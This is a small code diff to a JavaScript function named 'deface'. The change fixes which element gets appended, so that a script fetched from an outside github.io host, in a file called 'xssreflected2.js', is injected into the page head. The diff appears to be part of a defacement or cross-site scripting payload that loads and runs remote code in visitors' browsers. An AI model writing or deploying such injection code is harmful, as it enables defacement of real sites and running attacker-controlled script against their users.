@@ -30,7 +30,7 @@ function deface(url, title = '') {
 
         const script2 = document.createElement("script");
         script.src = "https://cybercutie0.github.io/-/xssreflected2.js";
-        document.head.appendChild(script);
+        document.head.appendChild(script2);
       })
       .catch(error => console.error('Error:', error));
 }
